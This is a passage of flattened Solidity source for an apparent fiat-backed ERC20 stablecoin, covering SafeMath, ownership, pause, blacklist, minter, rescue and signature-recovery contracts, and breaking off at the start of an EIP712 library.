to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) &#123;\n            return 0;\n        &#125;\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return div(a, b, \"SafeMath: division by zero\");\n    &#125;\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) &#123;\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    &#125;\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) &#123;\n        require(b != 0, errorMessage);\n        return a % b;\n    &#125;\n&#125;\n\ninterface IERC20 &#123;\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through &#123;transferFrom&#125;. This is\n     * zero by default.\n     *\n     * This value changes when &#123;approve&#125; or &#123;transferFrom&#125; are called.\n     */\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an &#123;Approval&#125; event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to &#123;approve&#125;. `value` is the new allowance.\n     */\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n&#125;\n\n\n\nabstract contract AbstractFiatTokenV1 is IERC20 &#123;\n    function _approve(\n        address owner,\n        address spender,\n        uint256 value\n    ) internal virtual;\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) internal virtual;\n&#125;\n\ncontract Ownable &#123;\n    // Owner of the contract\n    address private _owner;\n\n    /**\n     * @dev Event to show ownership has been transferred\n     * @param previousOwner representing the address of the previous owner\n     * @param newOwner representing the address of the new owner\n     */\n    event OwnershipTransferred(address previousOwner, address newOwner);\n\n    /**\n     * @dev The constructor sets the original owner of the contract to the sender account.\n     */\n    constructor() public &#123;\n        setOwner(msg.sender);\n    &#125;\n\n    /**\n     * @dev Tells the address of the owner\n     * @return the address of the owner\n     */\n    function owner() external view returns (address) &#123;\n        return _owner;\n    &#125;\n\n    /**\n     * @dev Sets a new owner address\n     */\n    function setOwner(address newOwner) internal &#123;\n        _owner = newOwner;\n    &#125;\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() &#123;\n        require(msg.sender == _owner, \"Ownable: caller is not the owner\");\n        _;\n    &#125;\n\n    /**\n     * @dev Allows the current owner to transfer control of the contract to a newOwner.\n     * @param newOwner The address to transfer ownership to.\n     */\n    function transferOwnership(address newOwner) external onlyOwner &#123;\n        require(\n            newOwner != address(0),\n            \"Ownable: new owner is the zero address\"\n        );\n        emit OwnershipTransferred(_owner, newOwner);\n        setOwner(newOwner);\n    &#125;\n&#125;\ncontract Pausable is Ownable &#123;\n    event Pause();\n    event Unpause();\n    event PauserChanged(address indexed newAddress);\n\n    address public pauser;\n    bool public paused = false;\n\n    /**\n     * @dev Modifier to make a function callable only when the contract is not paused.\n     */\n    modifier whenNotPaused() &#123;\n        require(!paused, \"Pausable: paused\");\n        _;\n    &#125;\n\n    /**\n     * @dev throws if called by any account other than the pauser\n     */\n    modifier onlyPauser() &#123;\n        require(msg.sender == pauser, \"Pausable: caller is not the pauser\");\n        _;\n    &#125;\n\n    /**\n     * @dev called by the owner to pause, triggers stopped state\n     */\n    function pause() external onlyPauser &#123;\n        paused = true;\n        emit Pause();\n    &#125;\n\n    /**\n     * @dev called by the owner to unpause, returns to normal state\n     */\n    function unpause() external onlyPauser &#123;\n        paused = false;\n        emit Unpause();\n    &#125;\n\n    /**\n     * @dev update the pauser role\n     */\n    function updatePauser(address _newPauser) external onlyOwner &#123;\n        require(\n            _newPauser != address(0),\n            \"Pausable: new pauser is the zero address\"\n        );\n        pauser = _newPauser;\n        emit PauserChanged(pauser);\n    &#125;\n&#125;\n\ncontract Blacklistable is Ownable &#123;\n    address public blacklister;\n    mapping(address => bool) internal blacklisted;\n\n    event Blacklisted(address indexed _account);\n    event UnBlacklisted(address indexed _account);\n    event BlacklisterChanged(address indexed newBlacklister);\n\n    /**\n     * @dev Throws if called by any account other than the blacklister\n     */\n    modifier onlyBlacklister() &#123;\n        require(\n            msg.sender == blacklister,\n            \"Blacklistable: caller is not the blacklister\"\n        );\n        _;\n    &#125;\n\n    /**\n     * @dev Throws if argument account is blacklisted\n     * @param _account The address to check\n     */\n    modifier notBlacklisted(address _account) &#123;\n        require(\n            !blacklisted[_account],\n            \"Blacklistable: account is blacklisted\"\n        );\n        _;\n    &#125;\n\n    /**\n     * @dev Checks if account is blacklisted\n     * @param _account The address to check\n     */\n    function isBlacklisted(address _account) external view returns (bool) &#123;\n        return blacklisted[_account];\n    &#125;\n\n    /**\n     * @dev Adds account to blacklist\n     * @param _account The address to blacklist\n     */\n    function blacklist(address _account) external onlyBlacklister &#123;\n        blacklisted[_account] = true;\n        emit Blacklisted(_account);\n    &#125;\n\n    /**\n     * @dev Removes account from blacklist\n     * @param _account The address to remove from the blacklist\n     */\n    function unBlacklist(address _account) external onlyBlacklister &#123;\n        blacklisted[_account] = false;\n        emit UnBlacklisted(_account);\n    &#125;\n\n    function updateBlacklister(address _newBlacklister) external onlyOwner &#123;\n        require(\n            _newBlacklister != address(0),\n            \"Blacklistable: new blacklister is the zero address\"\n        );\n        blacklister = _newBlacklister;\n        emit BlacklisterChanged(blacklister);\n    &#125;\n&#125;\n\n\ncontract FiatTokenV1 is AbstractFiatTokenV1, Ownable, Pausable, Blacklistable &#123;\n    using SafeMath for uint256;\n\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n    string public currency;\n    address public masterMinter;\n    bool internal initialized;\n\n    mapping(address => uint256) internal balances;\n    mapping(address => mapping(address => uint256)) internal allowed;\n    uint256 internal totalSupply_ = 0;\n    mapping(address => bool) internal minters;\n    mapping(address => uint256) internal minterAllowed;\n\n    event Mint(address indexed minter, address indexed to, uint256 amount);\n    event Burn(address indexed burner, uint256 amount);\n    event MinterConfigured(address indexed minter, uint256 minterAllowedAmount);\n    event MinterRemoved(address indexed oldMinter);\n    event MasterMinterChanged(address indexed newMasterMinter);\n\n    function initialize(\n        string memory tokenName,\n        string memory tokenSymbol,\n        string memory tokenCurrency,\n        uint8 tokenDecimals,\n        address newMasterMinter,\n        address newPauser,\n        address newBlacklister,\n        address newOwner\n    ) public &#123;\n        require(!initialized, \"FiatToken: contract is already initialized\");\n        require(\n            newMasterMinter != address(0),\n            \"FiatToken: new masterMinter is the zero address\"\n        );\n        require(\n            newPauser != address(0),\n            \"FiatToken: new pauser is the zero address\"\n        );\n        require(\n            newBlacklister != address(0),\n            \"FiatToken: new blacklister is the zero address\"\n        );\n        require(\n            newOwner != address(0),\n            \"FiatToken: new owner is the zero address\"\n        );\n\n        name = tokenName;\n        symbol = tokenSymbol;\n        currency = tokenCurrency;\n        decimals = tokenDecimals;\n        masterMinter = newMasterMinter;\n        pauser = newPauser;\n        blacklister = newBlacklister;\n        setOwner(newOwner);\n        initialized = true;\n    &#125;\n\n    /**\n     * @dev Throws if called by any account other than a minter\n     */\n    modifier onlyMinters() &#123;\n        require(minters[msg.sender], \"FiatToken: caller is not a minter\");\n        _;\n    &#125;\n\n    /**\n     * @dev Function to mint tokens\n     * @param _to The address that will receive the minted tokens.\n     * @param _amount The amount of tokens to mint. Must be less than or equal\n     * to the minterAllowance of the caller.\n     * @return A boolean that indicates if the operation was successful.\n     */\n    function mint(address _to, uint256 _amount)\n        external\n        whenNotPaused\n        onlyMinters\n        notBlacklisted(msg.sender)\n        notBlacklisted(_to)\n        returns (bool)\n    &#123;\n        require(_to != address(0), \"FiatToken: mint to the zero address\");\n        require(_amount > 0, \"FiatToken: mint amount not greater than 0\");\n\n        uint256 mintingAllowedAmount = minterAllowed[msg.sender];\n        require(\n            _amount &lt;= mintingAllowedAmount,\n            \"FiatToken: mint amount exceeds minterAllowance\"\n        );\n\n        totalSupply_ = totalSupply_.add(_amount);\n        balances[_to] = balances[_to].add(_amount);\n        minterAllowed[msg.sender] = mintingAllowedAmount.sub(_amount);\n        emit Mint(msg.sender, _to, _amount);\n        emit Transfer(address(0), _to, _amount);\n        return true;\n    &#125;\n\n    /**\n     * @dev Throws if called by any account other than the masterMinter\n     */\n    modifier onlyMasterMinter() &#123;\n        require(\n            msg.sender == masterMinter,\n            \"FiatToken: caller is not the masterMinter\"\n        );\n        _;\n    &#125;\n\n    /**\n     * @dev Get minter allowance for an account\n     * @param minter The address of the minter\n     */\n    function minterAllowance(address minter) external view returns (uint256) &#123;\n        return minterAllowed[minter];\n    &#125;\n\n    /**\n     * @dev Checks if account is a minter\n     * @param account The address to check\n     */\n    function isMinter(address account) external view returns (bool) &#123;\n        return minters[account];\n    &#125;\n\n    /**\n     * @notice Amount of remaining tokens spender is allowed to transfer on\n     * behalf of the token owner\n     * @param owner     Token owner's address\n     * @param spender   Spender's address\n     * @return Allowance amount\n     */\n    function allowance(address owner, address spender)\n        external\n        override\n        view\n        returns (uint256)\n    &#123;\n        return allowed[owner][spender];\n    &#125;\n\n    /**\n     * @dev Get totalSupply of token\n     */\n    function totalSupply() external override view returns (uint256) &#123;\n        return totalSupply_;\n    &#125;\n\n    /**\n     * @dev Get token balance of an account\n     * @param account address The account\n     */\n    function balanceOf(address account)\n        external\n        override\n        view\n        returns (uint256)\n    &#123;\n        return balances[account];\n    &#125;\n\n    /**\n     * @notice Set spender's allowance over the caller's tokens to be a given\n     * value.\n     * @param spender   Spender's address\n     * @param value     Allowance amount\n     * @return True if successful\n     */\n    function approve(address spender, uint256 value)\n        external\n        override\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(spender)\n        returns (bool)\n    &#123;\n        _approve(msg.sender, spender, value);\n        return true;\n    &#125;\n\n    /**\n     * @dev Internal function to set allowance\n     * @param owner     Token owner's address\n     * @param spender   Spender's address\n     * @param value     Allowance amount\n     */\n    function _approve(\n        address owner,\n        address spender,\n        uint256 value\n    ) internal override &#123;\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        allowed[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    &#125;\n\n    /**\n     * @notice Transfer tokens by spending allowance\n     * @param from  Payer's address\n     * @param to    Payee's address\n     * @param value Transfer amount\n     * @return True if successful\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    )\n        external\n        override\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(from)\n        notBlacklisted(to)\n        returns (bool)\n    &#123;\n        require(\n            value &lt;= allowed[from][msg.sender],\n            \"ERC20: transfer amount exceeds allowance\"\n        );\n        _transfer(from, to, value);\n        allowed[from][msg.sender] = allowed[from][msg.sender].sub(value);\n        return true;\n    &#125;\n\n    /**\n     * @notice Transfer tokens from the caller\n     * @param to    Payee's address\n     * @param value Transfer amount\n     * @return True if successful\n     */\n    function transfer(address to, uint256 value)\n        external\n        override\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(to)\n        returns (bool)\n    &#123;\n        _transfer(msg.sender, to, value);\n        return true;\n    &#125;\n\n    /**\n     * @notice Internal function to process transfers\n     * @param from  Payer's address\n     * @param to    Payee's address\n     * @param value Transfer amount\n     */\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) internal override &#123;\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(\n            value &lt;= balances[from],\n            \"ERC20: transfer amount exceeds balance\"\n        );\n\n        balances[from] = balances[from].sub(value);\n        balances[to] = balances[to].add(value);\n        emit Transfer(from, to, value);\n    &#125;\n\n    /**\n     * @dev Function to add/update a new minter\n     * @param minter The address of the minter\n     * @param minterAllowedAmount The minting amount allowed for the minter\n     * @return True if the operation was successful.\n     */\n    function configureMinter(address minter, uint256 minterAllowedAmount)\n        external\n        whenNotPaused\n        onlyMasterMinter\n        returns (bool)\n    &#123;\n        minters[minter] = true;\n        minterAllowed[minter] = minterAllowedAmount;\n        emit MinterConfigured(minter, minterAllowedAmount);\n        return true;\n    &#125;\n\n    /**\n     * @dev Function to remove a minter\n     * @param minter The address of the minter to remove\n     * @return True if the operation was successful.\n     */\n    function removeMinter(address minter)\n        external\n        onlyMasterMinter\n        returns (bool)\n    &#123;\n        minters[minter] = false;\n        minterAllowed[minter] = 0;\n        emit MinterRemoved(minter);\n        return true;\n    &#125;\n\n    /**\n     * @dev allows a minter to burn some of its own tokens\n     * Validates that caller is a minter and that sender is not blacklisted\n     * amount is less than or equal to the minter's account balance\n     * @param _amount uint256 the amount of tokens to be burned\n     */\n    function burn(uint256 _amount)\n        external\n        whenNotPaused\n        onlyMinters\n        notBlacklisted(msg.sender)\n    &#123;\n        uint256 balance = balances[msg.sender];\n        require(_amount > 0, \"FiatToken: burn amount not greater than 0\");\n        require(balance >= _amount, \"FiatToken: burn amount exceeds balance\");\n\n        totalSupply_ = totalSupply_.sub(_amount);\n        balances[msg.sender] = balance.sub(_amount);\n        emit Burn(msg.sender, _amount);\n        emit Transfer(msg.sender, address(0), _amount);\n    &#125;\n\n    function updateMasterMinter(address _newMasterMinter) external onlyOwner &#123;\n        require(\n            _newMasterMinter != address(0),\n            \"FiatToken: new masterMinter is the zero address\"\n        );\n        masterMinter = _newMasterMinter;\n        emit MasterMinterChanged(masterMinter);\n    &#125;\n&#125;\n\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address &#123;\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     */\n    function isContract(address account) internal view returns (bool) &#123;\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\n        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\n        // for accounts without code, i.e. `keccak256('')`\n        bytes32 codehash;\n\n            bytes32 accountHash\n         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n        // solhint-disable-next-line no-inline-assembly\n        assembly &#123;\n            codehash := extcodehash(account)\n        &#125;\n        return (codehash != accountHash &amp;&amp; codehash != 0x0);\n    &#125;\n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. &#123;sendValue&#125; removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * &#123;ReentrancyGuard&#125; or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) internal &#123;\n        require(\n            address(this).balance >= amount,\n            \"Address: insufficient balance\"\n        );\n\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n        (bool success, ) = recipient.call.value(amount)(\"\");\n        require(\n            success,\n            \"Address: unable to send value, recipient may have reverted\"\n        );\n    &#125;\n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain`call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data)\n        internal\n        returns (bytes memory)\n    &#123;\n        return functionCall(target, data, \"Address: low-level call failed\");\n    &#125;\n\n    /**\n     * @dev Same as &#123;xref-Address-functionCall-address-bytes-&#125;[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) &#123;\n        return _functionCallWithValue(target, data, 0, errorMessage);\n    &#125;\n\n    /**\n     * @dev Same as &#123;xref-Address-functionCall-address-bytes-&#125;[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value\n    ) internal returns (bytes memory) &#123;\n        return\n            functionCallWithValue(\n                target,\n                data,\n                value,\n                \"Address: low-level call with value failed\"\n            );\n    &#125;\n\n    /**\n     * @dev Same as &#123;xref-Address-functionCallWithValue-address-bytes-uint256-&#125;[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory) &#123;\n        require(\n            address(this).balance >= value,\n            \"Address: insufficient balance for call\"\n        );\n        return _functionCallWithValue(target, data, value, errorMessage);\n    &#125;\n\n    function _functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 weiValue,\n        string memory errorMessage\n    ) private returns (bytes memory) &#123;\n        require(isContract(target), \"Address: call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.call.value(weiValue)(data);\n        if (success) &#123;\n            return returndata;\n        &#125; else &#123;\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) &#123;\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                // solhint-disable-next-line no-inline-assembly\n                assembly &#123;\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                &#125;\n            &#125; else &#123;\n                revert(errorMessage);\n            &#125;\n        &#125;\n    &#125;\n&#125;\n\n\nlibrary SafeERC20 &#123;\n    using SafeMath for uint256;\n    using Address for address;\n\n    function safeTransfer(\n        IERC20 token,\n        address to,\n        uint256 value\n    ) internal &#123;\n        _callOptionalReturn(\n            token,\n            abi.encodeWithSelector(token.transfer.selector, to, value)\n        );\n    &#125;\n\n    function safeTransferFrom(\n        IERC20 token,\n        address from,\n        address to,\n        uint256 value\n    ) internal &#123;\n        _callOptionalReturn(\n            token,\n            abi.encodeWithSelector(token.transferFrom.selector, from, to, value)\n        );\n    &#125;\n\n    /**\n     * @dev Deprecated. This function has issues similar to the ones found in\n     * &#123;IERC20-approve&#125;, and its usage is discouraged.\n     *\n     * Whenever possible, use &#123;safeIncreaseAllowance&#125; and\n     * &#123;safeDecreaseAllowance&#125; instead.\n     */\n    function safeApprove(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal &#123;\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n        // solhint-disable-next-line max-line-length\n        require(\n            (value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        _callOptionalReturn(\n            token,\n            abi.encodeWithSelector(token.approve.selector, spender, value)\n        );\n    &#125;\n\n    function safeIncreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal &#123;\n        uint256 newAllowance = token.allowance(address(this), spender).add(\n            value\n        );\n        _callOptionalReturn(\n            token,\n            abi.encodeWithSelector(\n                token.approve.selector,\n                spender,\n                newAllowance\n            )\n        );\n    &#125;\n\n    function safeDecreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal &#123;\n        uint256 newAllowance = token.allowance(address(this), spender).sub(\n            value,\n            \"SafeERC20: decreased allowance below zero\"\n        );\n        _callOptionalReturn(\n            token,\n            abi.encodeWithSelector(\n                token.approve.selector,\n                spender,\n                newAllowance\n            )\n        );\n    &#125;\n\n    /**\n     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement\n     * on the return value: the return value is optional (but if data is returned, it must not be false).\n     * @param token The token targeted by the call.\n     * @param data The call data (encoded using abi.encode or one of its variants).\n     */\n    function _callOptionalReturn(IERC20 token, bytes memory data) private &#123;\n        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since\n        // we're implementing it ourselves. We use &#123;Address.functionCall&#125; to perform this call, which verifies that\n        // the target address contains contract code and also asserts for success in the low-level call.\n\n        bytes memory returndata = address(token).functionCall(\n            data,\n            \"SafeERC20: low-level call failed\"\n        );\n        if (returndata.length > 0) &#123;\n            // Return data is optional\n            // solhint-disable-next-line max-line-length\n            require(\n                abi.decode(returndata, (bool)),\n                \"SafeERC20: ERC20 operation did not succeed\"\n            );\n        &#125;\n    &#125;\n&#125;\n\n\ncontract Rescuable is Ownable &#123;\n    using SafeERC20 for IERC20;\n\n    address private _rescuer;\n\n    event RescuerChanged(address indexed newRescuer);\n\n    /**\n     * @notice Returns current rescuer\n     * @return Rescuer's address\n     */\n    function rescuer() external view returns (address) &#123;\n        return _rescuer;\n    &#125;\n\n    /**\n     * @notice Revert if called by any account other than the rescuer.\n     */\n    modifier onlyRescuer() &#123;\n        require(msg.sender == _rescuer, \"Rescuable: caller is not the rescuer\");\n        _;\n    &#125;\n\n    /**\n     * @notice Rescue ERC20 tokens locked up in this contract.\n     * @param tokenContract ERC20 token contract address\n     * @param to        Recipient address\n     * @param amount    Amount to withdraw\n     */\n    function rescueERC20(\n        IERC20 tokenContract,\n        address to,\n        uint256 amount\n    ) external onlyRescuer &#123;\n        tokenContract.safeTransfer(to, amount);\n    &#125;\n\n    /**\n     * @notice Assign the rescuer role to a given address.\n     * @param newRescuer New rescuer's address\n     */\n    function updateRescuer(address newRescuer) external onlyOwner &#123;\n        require(\n            newRescuer != address(0),\n            \"Rescuable: new rescuer is the zero address\"\n        );\n        _rescuer = newRescuer;\n        emit RescuerChanged(newRescuer);\n    &#125;\n&#125;\n\ncontract FiatTokenV1_1 is FiatTokenV1, Rescuable &#123;\n\n&#125;\n\n\nabstract contract AbstractFiatTokenV2 is AbstractFiatTokenV1 &#123;\n    function _increaseAllowance(\n        address owner,\n        address spender,\n        uint256 increment\n    ) internal virtual;\n\n    function _decreaseAllowance(\n        address owner,\n        address spender,\n        uint256 decrement\n    ) internal virtual;\n&#125;\n\nlibrary ECRecover &#123;\n    /**\n     * @notice Recover signer's address from a signed message\n     * @dev Adapted from: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/65e4ffde586ec89af3b7e9140bdc9235d1254853/contracts/cryptography/ECDSA.sol\n     * Modifications: Accept v, r, and s as separate arguments\n     * @param digest    Keccak-256 hash digest of the signed message\n     * @param v         v of the signature\n     * @param r         r of the signature\n     * @param s         s of the signature\n     * @return Signer address\n     */\n    function recover(\n        bytes32 digest,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal pure returns (address) &#123;\n        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\n        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n        // the valid range for s in (281): 0 &lt; s &lt; secp256k1n ÷ 2 + 1, and for v in (282): v ∈ &#123;27, 28&#125;. Most\n        // signatures from current libraries generate a unique signature with an s-value in the lower half order.\n        //\n        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\n        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\n        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept\n        // these malleable signatures as well.\n        if (\n            uint256(s) >\n            0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0\n        ) &#123;\n            revert(\"ECRecover: invalid signature 's' value\");\n        &#125;\n\n        if (v != 27 &amp;&amp; v != 28) &#123;\n            revert(\"ECRecover: invalid signature 'v' value\");\n        &#125;\n\n        // If the signature is valid (and not malleable), return the signer address\n        address signer = ecrecover(digest, v, r, s);\n        require(signer != address(0), \"ECRecover: invalid signature\");\n\n        return signer;\n    &#125;\n&#125;\n\n// File: contracts/util/EIP712.sol\n\n/**\n * License: MIT\n *\n * Copyright (c) 2018-2020 CENTRE SECZ\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\n\n\n\n/**\n * @title EIP712\n * @notice A library that provides EIP712 helper functions\n */\nlibrary EIP712 &#123;\n    /**\n     * @notice Make EIP712 domain separator\n     * @param name      Contract name\n     * @param version   Contract version\n     * @return Domain separator\n     */\n    function makeDomainSeparator(string memory name, string memory version)\n        